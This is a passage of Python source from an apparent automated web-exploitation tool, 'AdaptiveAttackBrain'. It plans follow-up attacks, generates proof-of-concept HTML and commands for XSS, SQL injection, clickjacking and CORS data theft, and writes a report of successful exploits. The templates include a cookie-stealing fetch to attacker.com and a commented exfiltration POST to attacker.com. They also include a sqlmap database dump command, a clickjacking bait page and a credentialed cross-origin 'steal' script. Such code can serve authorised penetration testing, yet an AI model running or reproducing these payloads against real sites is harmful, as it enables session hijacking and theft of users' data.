                reasoning="XSS confirmed, try session hijacking payload",
                confidence=Confidence.HIGH,
                priority=10,
            ))
        
        # If CORS found, try to access sensitive endpoints
        if "cors" in result.attack.type:
            self.thoughts.append(Thought(
                action="cors_data_exfil",
                reasoning="CORS confirmed, try to exfiltrate sensitive data",
                confidence=Confidence.HIGH,
                priority=10,
            ))
    
    # =========================================================================
    # POC GENERATORS
    # =========================================================================
    
    def _generate_poc(self, attack: Attack, response) -> str:
        """Generate PoC based on attack type."""
        if "xss" in attack.type:
            return self._generate_xss_poc(attack.target, attack.payload)
        elif "sqli" in attack.type:
            return self._generate_sqli_poc(attack.target, attack.payload)
        return ""
    
    def _generate_xss_poc(self, url: str, payload: str) -> str:
        """Generate XSS proof of concept."""
        return f"""<!-- XSS Proof of Concept -->
<!DOCTYPE html>
<html>
<head><title>XSS PoC</title></head>
<body>
<h1>XSS Vulnerability - Proof of Concept</h1>

<h2>Vulnerable URL</h2>
<code>{url}</code>

<h2>Payload</h2>
<pre>{payload}</pre>

<h2>Direct Link</h2>
<a href="{url}" target="_blank">Click to test (will show alert)</a>

<h2>Impact Demonstration</h2>
<p>This vulnerability allows an attacker to:</p>
<ul>
<li>Steal session cookies</li>
<li>Perform actions as the victim</li>
<li>Redirect to phishing pages</li>
<li>Inject malicious content</li>
</ul>

<h3>Session Hijacking Example</h3>
<pre>
&lt;script&gt;
fetch('https://attacker.com/steal?cookie='+document.cookie);
&lt;/script&gt;
</pre>
</body>
</html>"""
    
    def _generate_sqli_poc(self, url: str, payload: str) -> str:
        """Generate SQLi proof of concept."""
        return f"""-- SQL Injection Proof of Concept

Target URL: {url}
Payload: {payload}

Steps to reproduce:
1. Navigate to the URL
2. Observe the error message or modified response
3. Use sqlmap for automated extraction:
   sqlmap -u "{url}" --dbs

Impact:
- Database extraction
- Authentication bypass  
- Data modification
- Potential RCE via SQL functions
"""
    
    def _generate_clickjacking_poc(self, url: str) -> str:
        """Generate clickjacking PoC."""
        return f"""<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC</title>
<style>
body {{ font-family: Arial; padding: 20px; }}
.container {{ position: relative; width: 100%; height: 500px; }}
iframe {{ 
    position: absolute; width: 100%; height: 100%;
    opacity: 0.3; z-index: 2; border: 2px solid red;
}}
.bait {{
    position: absolute; z-index: 1;
    top: 150px; left: 100px;
    background: green; color: white;
    padding: 20px; font-size: 20px;
    cursor: pointer;
}}
</style>
</head>
<body>
<h1>Clickjacking PoC</h1>
<p>Target: {url}</p>
<div class="container">
    <div class="bait">🎁 Click for FREE Prize!</div>
    <iframe src="{url}"></iframe>
</div>
<p><em>The iframe opacity is set to 0.3 for demonstration. In a real attack it would be 0.0001</em></p>
</body>
</html>"""
    
    def _generate_cors_poc(self, url: str, origin: str) -> str:
        """Generate CORS PoC."""
        return f"""<!DOCTYPE html>
<html>
<head><title>CORS Data Theft PoC</title></head>
<body>
<h1>CORS Misconfiguration PoC</h1>
<p>Target: {url}</p>
<p>Malicious Origin: {origin}</p>

<button onclick="steal()">Steal Data</button>
<pre id="output"></pre>

<script>
async function steal() {{
    try {{
        const response = await fetch('{url}', {{
            credentials: 'include'
        }});
        const data = await response.text();
        document.getElementById('output').textContent = 'STOLEN:\\n' + data;
        
        // In real attack, exfiltrate:
        // fetch('https://attacker.com/collect', {{method:'POST', body:data}});
    }} catch(e) {{
        document.getElementById('output').textContent = 'Error: ' + e;
    }}
}}
</script>

<h2>Impact</h2>
<ul>
<li>Steal authenticated user's data</li>
<li>Access private API endpoints</li>
<li>Exfiltrate tokens and credentials</li>
</ul>
</body>
</html>"""
    
    # =========================================================================
    # REPORT GENERATION
    # =========================================================================
    
    def generate_report(self) -> str:
        """Generate comprehensive cognitive attack report."""
        successful = [r for r in self.results if r.success]
        failed = [r for r in self.results if not r.success]
        
        report = f"""# Adaptive Attack Brain Report

## Target Analysis

**URL:** {self.target_url}
**Tech Stack:** {self.memory.tech_stack}
**WAF Detected:** {self.memory.waf_detected or 'None'}

## Reconnaissance Summary

**Reflection Points Found:** {len(self.memory.reflection_points)}
**Injection Points Identified:** {len(self.memory.injection_points)}
**API Patterns Discovered:** {len(self.memory.api_patterns)}

## Attack Results

**Total Attacks:** {len(self.results)}
**Successful:** {len(successful)}
**Failed:** {len(failed)}

"""
        
        if successful:
            report += "## 🎯 Successful Exploits\n\n"
            for i, result in enumerate(successful, 1):
                report += f"""### {i}. {result.attack.name}

**Type:** {result.attack.type}
**Confidence:** {result.confidence.name} ({result.confidence.value}%)
**Target:** `{result.attack.target[:100]}...`

**Reasoning:** {result.attack.reasoning}

**Evidence:**
```json
{json.dumps(result.evidence, indent=2, default=str)[:500]}
```

**Proof of Concept:**
```html
{result.poc[:1000] if result.poc else "See evidence above"}
```

---

"""
        
        if not successful:
            report += """## Results

No exploitable vulnerabilities were found through adaptive testing.

The target appears to have robust security controls in place.
"""
        
        return report


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

async def adaptive_attack(
    target_url: str,
    initial_findings: List[dict] = None,
    http_client=None,
    rate_limiter=None,
    max_iterations: int = 10,
) -> Tuple[List[ExploitResult], str]:
    """
    Run adaptive cognitive attack analysis.
    
    Returns:
        Tuple of (results, report)
    """
    brain = AdaptiveAttackBrain(http_client, rate_limiter)
    results = await brain.analyze_and_exploit(
        target_url,
        initial_findings or [],
        max_iterations,
    )
    report = brain.generate_report()
    
    return results, report
